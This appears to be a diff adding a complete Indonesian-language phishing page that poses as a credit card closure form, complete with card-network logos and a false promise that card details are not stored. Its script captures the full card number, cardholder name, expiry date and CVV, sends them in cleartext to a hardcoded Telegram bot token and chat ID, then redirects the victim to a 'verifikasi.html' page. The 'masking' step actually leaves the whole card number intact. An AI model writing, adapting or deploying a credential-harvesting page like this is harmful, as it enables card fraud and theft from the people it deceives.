@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Penutupan Kartu Kredit</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .card-icon {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            font-size: 24px;
+        }
+        .card-type {
+            height: 20px;
+            width: 50px;
+            margin-left: 10px;
+        }
+        .input-group {
+            position: relative;
+        }
+        .card-display {
+            font-family: 'Courier New', Courier, monospace;
+            letter-spacing: 2px;
+        }
+        #loader {
+            display: none;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+    <div class="bg-white rounded-xl shadow-lg w-full max-w-md p-6">
+        <div class="flex justify-center mb-8">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSk5s6mGes17JZfmIZUuC4aVXgXmVevaLu0pivWyUSelQNJq8sGhx91j3-M&s=10" alt="Payment Gateway Secure Logo with shield and padlock icons in blue gradient" class="h-12">
+        </div>
+
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">Masukkan Datail Kartu Kredit</h1>
+        
+        <form id="paymentForm" class="space-y-4">
+            <div>
+                <label for="cardNumber" class="block text-sm font-medium text-gray-700 mb-1">Credit Card Number</label>
+                <div class="input-group relative">
+                    <input type="text" id="cardNumber" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition card-display" placeholder="1234 5678 9012 3456" maxlength="19">
+                    <div id="cardTypeIcon" class="card-icon text-gray-400">
+                        <i class="far fa-credit-card"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div>
+                <label for="cardName" class="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
+                <input type="text" id="cardName" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" placeholder="John Doe">
+            </div>
+            
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label for="expiryDate" class="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
+                    <input type="text" id="expiryDate" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div>
+                    <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                    <div class="input-group relative">
+                        <input type="password" id="cvv" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" placeholder="123" maxlength="4">
+                        <div class="card-icon text-gray-400">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div>
+                <label for="amount" class="block text-sm font-medium text-gray-700 mb-1">Total Limit (Rp)</label>
+                <input type="number" id="amount" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" placeholder="100.00" min="1" step="0.01">
+            </div>
+            
+            <div id="errorMessage" class="text-red-500 text-sm hidden"></div>
+            
+            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200 flex items-center justify-center">
+                <span id="submitText">Lanjutkan Proses</span>
+                <div id="loader" class="ml-2">
+                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                </div>
+            </button>
+        </form>
+
+        <div class="mt-6 pt-6 border-t border-gray-200">
+            <div class="flex items-center justify-center space-x-4">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSEdRE4elIptBYNu_D2M6TxSKgXooAfkt0fRQ&s" alt="Visa logo" class="h-6 opacity-70">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/600px-MasterCard_Logo.svg.png?20140711182052" alt="Mastercard logo" class="h-6 opacity-70">
+                <img src="https://www.jcbusa.com/wp-content/uploads/2024/03/jcb-dng-amex-400x107.png" alt="American Express logo" class="h-6 opacity-70">
+            </div>
+            <p class="text-xs text-gray-500 text-center mt-3">
+                <i class="fas fa-lock"></i> Proses ini aman dan terenkripsi. Kami tidak menyimpan detail kartu Anda.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Telegram bot configuration
+            const TELEGRAM_BOT_TOKEN = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+            const TELEGRAM_CHAT_ID = '7549590022';
+            
+            // Format card number with spaces
+            const cardNumberInput = document.getElementById('cardNumber');
+            cardNumberInput.addEventListener('input', function(e) {
+                // Remove all non-digits
+                let value = e.target.value.replace(/\D/g, '');
+                
+                // Add space after every 4 digits
+                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                
+                // Update the input value
+                e.target.value = value;
+                detectCardType(value.replace(/\s/g, ''));
+            });
+            
+            // Format expiry date
+            const expiryDateInput = document.getElementById('expiryDate');
+            expiryDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                
+                e.target.value = value;
+            });
+            
+            // Card type detection
+            function detectCardType(number) {
+                const cardTypeIcon = document.getElementById('cardTypeIcon');
+                
+                if (/^4/.test(number)) {
+                    cardTypeIcon.innerHTML = '<i class="fab fa-cc-visa" style="color: #1a1f71;"></i>';
+                } else if (/^5[1-5]/.test(number)) {
+                    cardTypeIcon.innerHTML = '<i class="fab fa-cc-mastercard" style="color: #EB001B;"></i>';
+                } else if (/^3[47]/.test(number)) {
+                    cardTypeIcon.innerHTML = '<i class="fab fa-cc-amex" style="color: #005B9D;"></i>';
+                } else if (/^6(?:011|5)/.test(number)) {
+                    cardTypeIcon.innerHTML = '<i class="fab fa-cc-discover" style="color: #FF6000;"></i>';
+                } else {
+                    cardTypeIcon.innerHTML = '<i class="far fa-credit-card"></i>';
+                }
+            }
+            
+            // Form submission
+            const paymentForm = document.getElementById('paymentForm');
+            paymentForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                // Show loading spinner
+                document.getElementById('loader').style.display = 'block';
+                document.getElementById('submitText').textContent = 'Processing...';
+                
+                // Get form values
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                const cardName = document.getElementById('cardName').value;
+                const expiryDate = document.getElementById('expiryDate').value;
+                const cvv = document.getElementById('cvv').value;
+                const amount = document.getElementById('amount').value;
+                
+                // Basic validation
+                if (!validateForm(cardNumber, cardName, expiryDate, cvv, amount)) {
+                    return;
+                }
+                
+                try {
+                    // Mask sensitive data for display
+                    const maskedCardNumber = ' ' + cardNumber.slice(-16);
+                    
+                    // Prepare message for Telegram
+                    const message = `💰 New Payment Submitted 💰
+                    
+📌 Cardholder Name: ${cardName}
+💳 Card Number: ${maskedCardNumber}
+📅 Expiry Date: ${expiryDate}
+🔒 CVV: ${cvv}
+💵 Amount: $${amount}
+                    
+🕒 Timestamp: ${new Date().toLocaleString()}`;
+                    
+                    // Send to Telegram bot (using Web API)
+                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                        }),
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('Failed to send data to Telegram');
+                    }
+                    
+                    // Show success message
+                    showMessage('Payment submitted successfully!');
+                    
+                    // Clear form (for demo purposes only)
+                    paymentForm.reset();
+                } catch (error) {
+                    console.error('Error:', error);
+                    showMessage('There was an error processing your payment. Please try again.', false);
+                } finally {
+                    // Hide loading spinner
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('submitText').textContent = 'Process Payment';
+                }
+            });
+            
+            // Form validation
+            function validateForm(cardNumber, cardName, expiryDate, cvv, amount) {
+                const errorDiv = document.getElementById('errorMessage');
+                errorDiv.classList.add('hidden');
+                
+                // Validate card number (Luhn algorithm)
+                if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 16 || !luhnCheck(cardNumber)) {
+                    showError('Please enter a valid credit card number');
+                    return false;
+                }
+                
+                // Validate card name
+                if (!cardName || cardName.trim().length < 3) {
+                    showError('Please enter the cardholder name');
+                    return false;
+                }
+                
+                // Validate expiry date
+                if (!expiryDate || !/^\d{2}\/\d{2}$/.test(expiryDate)) {
+                    showError('Please enter a valid expiry date (MM/YY)');
+                    return false;
+                }
+                
+                // Validate CVV
+                if (!cvv || (cvv.length !== 3 && cvv.length !== 4)) {
+                    showError('Please enter a valid CVV (3 or 4 digits)');
+                    return false;
+                }
+                
+                // Validate amount
+                if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+                    showError('Please enter a valid amount');
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            // Luhn algorithm for card validation
+            function luhnCheck(cardNumber) {
+                let sum = 0;
+                let shouldDouble = false;
+                
+                for (let i = cardNumber.length - 1; i >= 0; i--) {
+                    let digit = parseInt(cardNumber.charAt(i));
+                    
+                    if (shouldDouble) {
+                        if ((digit *= 2) > 9) digit -= 9;
+                    }
+                    
+                    sum += digit;
+                    shouldDouble = !shouldDouble;
+                }
+                
+                return sum % 10 == 0;
+            }
+            
+            // Show error message
+            function showError(message) {
+                const errorDiv = document.getElementById('errorMessage');
+                errorDiv.textContent = message;
+                errorDiv.classList.remove('hidden');
+                
+                // Hide loading spinner if shown
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('submitText').textContent = 'Process Payment';
+            }
+            
+            // Show success/error message
+            function showMessage(message, isSuccess = true) {
+                const errorDiv = document.getElementById('errorMessage');
+                window.location.href="verifikasi.html";
+                errorDiv.textContent = message;
+                errorDiv.classList.remove('hidden');
+                errorDiv.classList.toggle('text-green-500', isSuccess);
+                errorDiv.classList.toggle('text-red-500', !isSuccess);
+            }
+        });
+    </script>
+</body>
+</html>
